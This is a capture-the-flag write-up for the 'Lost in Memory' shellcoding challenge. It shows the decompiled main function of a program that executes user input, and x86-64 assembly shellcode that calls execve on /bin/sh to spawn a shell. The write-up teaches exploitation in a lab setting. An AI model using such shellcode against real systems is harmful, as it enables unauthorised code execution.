# Lost in Memory

**Category:** Shellcoding

## Overview

```text
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *new_stack_ptr; // [rsp+18h] [rbp-18h]
  char *shellcode_ptr; // [rsp+20h] [rbp-10h]
  char *shellcode_ptra; // [rsp+20h] [rbp-10h]
  char *go; // [rsp+28h] [rbp-8h]

  init_buffers();
  new_stack_ptr = init_random_page(3, nullptr) + 4096;
  shellcode_ptr = init_random_page(7, "flag");
  go = &shellcode_ptr[strlen(shellcode_ptr) + 1];
  shellcode_ptra = append_stub(shellcode_ptr, new_stack_ptr);
  puts("I forgot where I put my flag :(");
  puts("Can you help me recover it?");
  printf(" > ");
  read(0, shellcode_ptra, 0x200u);
  prctl(22, 1);
  ((void (__fastcall *)(__int64))go)(22);
  return 0;
}
```
Disassembled main function

## Analysis
As we can see above, the flag is placed before the shellcode so we could perform a write syscall to print the flag. We can derive the length of the flag and the distance between the flag and the shellcode address.
However the binary is also vulnerable to a shellcode that executes an execve on /bin/sh\0.

The exploit below is the latter because it was my first try. 



## Vulnerability
Classic shellcode vulnerability, the input of the user gets executed.


## Exploitation

```text
xor rax, rax
push rax
xor rsi, rsi    argv not needed
xor rdx, rdx    envp not needed
mov rax, 0x3b   syscall number for execve
mov rdi, 0x0068732f6e69622f   /bin/sh\0
push rdi
mov rdi, rsp    in this way rdi points to the /bin/sh\0 placed on the stack
syscall
```